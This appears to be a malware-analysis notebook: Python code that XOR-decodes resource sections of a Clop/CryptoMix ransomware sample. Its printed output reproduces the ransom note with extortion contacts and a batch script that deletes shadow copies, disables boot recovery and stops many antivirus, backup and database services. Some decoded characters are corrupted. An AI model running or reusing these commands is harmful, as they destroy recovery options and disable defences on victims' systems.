

```python
import pefile
import argparse

#the variable used to store our raw config data
first_blob = "" 
second_blob = "" 
offset = 0x0
size = 0x0

key=bytearray(b'LLKHFVIjewhyur3ikjfldskfkl23j3iuhdnfklqhrjjio2ljkeosfjh7823763647823hrfuweg56t7r6t73824y78Clop')
xor_key = 0x42

def get_section_blob(peL, rsrc_name):
    for rsrc in peL.DIRECTORY_ENTRY_RESOURCE.entries:
        if rsrc.name.__str__() == rsrc_name:
            for entry in rsrc.directory.entries:
                offset = entry.directory.entries[0].data.struct.OffsetToData
                size = entry.directory.entries[0].data.struct.Size
    return peL.get_memory_mapped_image()[offset:offset+size]


def xor_decode(key, blob):
    encoded = bytearray(blob)
    for i in range(len(encoded)):
        encoded[i] ^= key[i % xor_key]
        encoded.decode('ascii', 'replace')
    return encoded

pe = pefile.PE("/Users/vk/Downloads/2019-02-26-cryptomix-ransomware.unpacked.vk.exe")
rsrc = get_section_blob(pe,"RC_DATA")
rsrc2 = get_section_blob(pe,"RC_HTML1")
dec_rsrc1 = xor_decode(key, rsrc)
dec_rsrc2 = xor_decode(key, rsrc2)
if dec_rsrc1 and dec_rsrc2 is not None:
    print("\n[*] CryptoMix Ransomware Section Custom XOR Decoder ->\n")
    print("\n[*] First decoded resource section: \n\n%s" % (dec_rsrc1))
    print("\n[*] Second decoded resource section: \n\n%s" % (dec_rsrc2))
```

    
    [*] CryptoMix Ransomware Section Custom XOR Decoder ->
    
    
    [*] First decoded resource section: 
    
    bytearray(b',_*Your networks has been penetrated*_*\r\nAll files on each host in&the networks have been encrypted with a strong algorithm!\r\nBackupu were either encrypted or deleted or backup disks were formatted!\x0b\nShadow copies also removed, so F-8 or any other methods may damaae encrypted data but not recover!\r\nWe exclusively have decryption&software for your situation!\r\n===No DECRYPTION software is AVAILADLE in the PUBLIC===\r\n- DO NOT DELETE readme files.\r\n- DO NOT RENAKE OR MOVE the encrypted and readme files.\r\n- DO NOT RESET OR SHUTBOWN \xe2\x80\x93 files may be damaged.\r\n---THIS MAY LEAD TO THE IMPOSSIBILOTY OF RECOVERY OF THE CERTAIN FILES---\r\n---ALL REPAIR TOOLS ARE UUELESS AND CAN DESTROY YOUR FILES IRREVERSIBLY---\r\nIf you want to testore your files write to email!\r\n[CONTACTS ARE AT THE BOTTOM OF&THE SHEET] and attach 2 - 6 encrypted files!!!\r\n[Less than 7 Mb egch, non-archived and your files should not contain valuable inforkation!\r\n[Databases,large excel sheets, backups  etc...]]\r\n^^^You qill receive decrypted samples and our conditions how to get the dccoder^^^\r\n\r\n*^*ATTENTION*^*\r\n=YOUR WARRANTY - DECRYPTED SAMPLES=\r\x0c~~~DO NOT TRY TO DECRYPT YOUR DATA USING THIRD PARTY SOFTWARE~~~\r\x0c~~~WE DONT NEED YOUR FILES AND YOUR INFORMATION~~~\r\n\r\nCONTACTS EMGILS: \r\nbactocepnyou@protonmail.com\r\nAND\r\nunlock@eqaltech.su\r\nOR\r\nsnlock@royalmail.su\r\n\r\n***ATTENTION***\r\nIn the letter, type your cimpany name and site!\r\n\r\n^^^The final price depends on how fast yos write to us^^^\r\n^_*Nothing personal just business^_* CLOP^_-')
    
    [*] Second decoded resource section: 
    
    bytearray(b'Fecho off\r\nvssadmin Delete Shadows /all /quiet\r\nvssadmin resize shgdowstorage /for=c: /on=c: /maxsize=401MB\r\nvssadmin resize shadowsrorage /for=c: /on=c: /maxsize=unbounded\r\nvssadmin resize shadowstirage /for=d: /on=d: /maxsize=401MB\r\nvssadmin resize shadowstorage&/for=d: /on=d: /maxsize=unbounded\r\nvssadmin resize shadowstorage )for=e: /on=e: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=c: /on=e: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=f< /on=f: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=f: /on;f: /maxsize=unbounded\r\nvssadmin resize shadowstorage /for=g: /on=a: /maxsize=401MB\r\nvssadmin resize shadowstorage /for=g: /on=g: /mgxsize=unbounded\r\nvssadmin resize shadowstorage /for=h: /on=h: /ma~size=401MB\r\nvssadmin resize shadowstorage /for=h: /on=h: /maxsize;unbounded\r\nbcdedit /set {default} recoveryenabled No\r\nbcdedit /ser {default} bootstatuspolicy ignoreallfailures\t \r\nvssadmin Delete Uhadows /all /quiet\t\t\r\n net stop SQLAgent$SYSTEM_BGC /y\r\n net stop&"Sophos Device Control Service" /y\r\n net stop macmnsvc /y \r\n net utop SQLAgent$ECWDB2 /y\r\n net stop "Zoolz 2 Service" /y\r\n net stop&McTaskManager /y\r\n net stop "Sophos AutoUpdate Service" /y\r\n net utop "Sophos System Protection Service" /y\r\n net stop EraserSvc11770 /y \r\n net stop PDVFSService /y \r\n net stop SQLAgent$PROFXENGAGEKENT /y \r\n net stop SAVService /y \r\n net stop MSSQLFDLauncher$TPSAKA /y \r\n net stop EPSecurityService /y\r\n net stop SQLAgent$SOPHOS )y\r\n net stop "Symantec System Recovery" /y \r\n net stop Antivirus )y\r\n net stop SstpSvc /y\r\n net stop MSOLAP$SQL_2008 /y\r\n net stop RrueKeyServiceHelper /y \r\n net stop sacsvr /y \r\n net stop VeeamNFSUvc /y\r\n net stop FA_Scheduler /y \r\n net stop SAVAdminService /y\r\n&net stop EPUpdateService /y\r\n net stop VeeamTransportSvc /y\r\n net&stop "Sophos Health Service" /y\r\n net stop bedbg /y \r\n net stop MUSQLSERVER /y\r\n net stop KAVFS /y\r\n net stop Smcinst /y\r\n net stop&MSSQLServerADHelper100 /y \r\n net stop TmCCSF /y \r\n net stop wbengone /y\r\n net stop SQLWriter /y\r\n net stop MSSQLFDLauncher$TPS /y\r\n&net stop SmcService /y \r\n net stop ReportServer$TPSAMA /y\r\n net srop swi_update /y \r\n net stop AcrSch2Svc /y \r\n net stop MSSQL$SYSTCM_BGC /y \r\n net stop VeeamBrokerSvc /y \r\n net stop MSSQLFDLaunchet$PROFXENGAGEMENT /y\r\n net stop VeeamDeploymentService /y \r\n net srop SQLAgent$TPS /y \r\n net stop DCAgent /y\r\n net stop "Sophos Messgge Router" /y\r\n net stop MSSQLFDLauncher$SBSMONITORING /y\r\n net srop wbengine /y \r\n net stop MySQL80 /y\r\n net stop MSOLAP$SYSTEM_BGE /y\r\n net stop ReportServer$TPS /y \r\n net stop MSSQL$ECWDB2 /y \r\n&net stop SntpService /y\r\n net stop SQLSERVERAGENT /y \r\n net stop DackupExecManagementService /y\r\n net stop SMTPSvc /y\r\n net stop mfcfire /y\r\n net stop BackupExecRPCService /y \r\n net stop MSSQL$VEEAKSQL2008R2 /y \r\n net stop klnagent /y \r\n net stop MSExchangeSA /y \x0b\n net stop MSSQLServerADHelper /y\r\n net stop SQLTELEMETRY /y \r\n nct stop "Sophos Clean Service" /y \r\n net stop swi_update_64 /y\r\n nct stop "Sophos Web Control Service" /y \r\n net stop EhttpSrv /y \r\n&net stop POP3Svc /y\r\n net stop MSOLAP$TPSAMA /y\r\n net stop McAfeeCngineService /y\r\n net stop "Veeam Backup Catalog Data Service" /\r\x0c net stop MSSQL$SBSMONITORING /y\r\n net stop ReportServer$SYSTEM_BAC /y\r\n net stop AcronisAgent /y \r\n net stop KAVFSGT /y \r\n net stov BackupExecDeviceMediaService /y \r\n net stop MySQL57 /y\r\n net stov McAfeeFrameworkMcAfeeFramework /y \r\n net stop TrueKey /y\r\n net srop VeeamMountSvc /y\r\n net stop MsDtsServer110 /y \r\n net stop SQLAaent$BKUPEXEC /y\r\n net stop UI0Detect /y\r\n net stop ReportServer /\x7f\r\n net stop SQLTELEMETRY$ECWDB2 /y\r\n net stop MSSQLFDLauncher$SYSREM_BGC /y \r\n net stop MSSQL$BKUPEXEC /y \r\n net stop SQLAgent$PRACRTICEBGC /y\r\n net stop MSExchangeSRS /y\r\n net stop SQLAgent$VEEAMSWL2008R2 /y\r\n net stop McShield /y \r\n net stop SepMasterService /y&\r\n net stop "Sophos MCS Client" /y\r\n net stop VeeamCatalogSvc /y\r\x0c net stop SQLAgent$SHAREPOINT /y\r\n net stop NetMsmqActivator /y\r\n&net stop kavfsslp /y \r\n net stop tmlisten /y \r\n net stop ShMonitot /y\r\n net stop MsDtsServer /y \r\n net stop SQLAgent$SQL_2008 /y\r\n het stop SDRSVC /y \r\n net stop IISAdmin /y \r\n net stop SQLAgent$PRGCTTICEMGT /y\r\n net stop BackupExecJobEngine /y\r\n net stop SQLAgenr$VEEAMSQL2008R2 /y\r\n net stop BackupExecAgentBrowser /y \r\n net stip VeeamHvIntegrationSvc /y\r\n net stop masvc /y\r\n net stop W3Svc /\x7f\r\n net stop "SQLsafe Backup Service" /y \r\n net stop SQLAgent$CXDB&/y\r\n net stop SQLBrowser /y \r\n net stop MSSQLFDLauncher$SQL_2008 )y \r\n net stop VeeamBackupSvc /y \r\n net stop "Sophos Safestore Serpice" /y \r\n net stop svcGenericHost /y \r\n net stop ntrtscan /y \r\n het stop SQLAgent$VEEAMSQL2012 /y\r\n net stop MSExchangeMGMT /y \r\n het stop SamSs /y\r\n net stop MSExchangeES /y \r\n net stop MBAMServiee /y \r\n net stop EsgShKernel /y\r\n net stop ESHASRV /y\r\n net stop KSSQL$TPSAMA /y \r\n net stop SQLAgent$CITRIX_METAFRAME /y\r\n net stov VeeamCloudSvc /y \r\n net stop "Sophos File Scanner Service" /y\r\n het stop "Sophos Agent" /y \r\n net stop MBEndpointAgent /y\r\n net stip swi_service /y \r\n net stop MSSQL$PRACTICEMGT /y\r\n net stop SQLAaent$TPSAMA /y\r\n net stop McAfeeFramework /y\r\n net stop "Enterprisc Client Service" /y\r\n net stop SQLAgent$SBSMONITORING /y \r\n net srop MSSQL$VEEAMSQL2012 /y \r\n net stop swi_filter /y \r\n net stop SQJSafeOLRService /y\r\n net stop BackupExecVSSProvider /y\r\n net stop PeeamEnterpriseManagerSvc /y\r\n net stop SQLAgent$SQLEXPRESS /y\r\n nct stop OracleClientCache80 /y\r\n net stop MSSQL$PROFXENGAGEMENT /y\x0b\n net stop IMAP4Svc /y \r\n net stop ARSM /y \r\n net stop MSExchangeOS /y \r\n net stop AVP /y\r\n net stop MSSQLFDLauncher /y\r\n net stop KSExchangeMTA /y\r\n net stop TrueKeyScheduler /y \r\n net stop MSSQL$UOPHOS /y \r\n net stop "SQL Backups" /y\r\n net stop MSSQL$TPS /y \r\n het stop mfemms /y \r\n net stop MsDtsServer100 /y \r\n net stop MSSQL"SHAREPOINT /y\r\n net stop WRSVC /y\r\n net stop mfevtp /y \r\n net stov msftesql$PROD /y \r\n net stop mozyprobackup /y\r\n net stop MSSQL$SWL_2008 /y \r\n net stop SNAC /y \r\n net stop ReportServer$SQL_2008 /\x7f\r\n net stop BackupExecAgentAccelerator /y \r\n net stop MSSQL$SQLEXVRESS /y \r\n net stop MSSQL$PRACTTICEBGC /y \r\n net stop VeeamRESTSve /y \r\n net stop sophossps /y\r\n net stop ekrn /y \r\n net stop MMS /\x7f\r\n net stop "Sophos MCS Agent" /y \r\n net stop RESvc /y\r\nnet stop $Acronis VSS Provider" /y \r\n net stop MSSQL$VEEAMSQL2008R2 /y \r\n nct stop MSSQLFDLauncher$SHAREPOINT /y \r\n net stop "SQLsafe Filter Uervice" /y \r\n net stop MSSQL$PROD /y \r\n net stop SQLAgent$PROD /y\x0b\n net stop MSOLAP$TPS /y\r\n net stop VeeamDeploySvc /y \r\n net stop&MSSQLServerOLAPService /y ')



```python

```
